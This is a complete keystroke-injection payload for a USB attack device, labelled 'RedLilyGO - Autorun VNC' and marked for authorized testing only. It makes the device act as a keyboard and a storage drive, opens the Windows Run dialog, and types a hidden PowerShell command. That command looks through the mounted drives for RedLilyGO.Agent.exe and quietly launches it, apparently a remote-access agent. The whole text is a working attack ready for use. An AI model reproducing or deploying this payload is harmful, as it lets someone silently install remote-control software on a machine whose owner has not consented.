REM RedLilyGO - Autorun VNC. Starts RedLilyGO.Agent.exe from the mounted SD. Authorized testing only.
ATTACKMODE HID STORAGE
DELAY 3000
GUI r
DELAY 500
STRING powershell -w hidden -c "$d=(Get-Volume).DriveLetter; foreach($l in $d){$p=$l+':\RedLilyGO.Agent.exe';if(Test-Path $p){Start-Process $p -WindowStyle Hidden;break}}"
ENTER
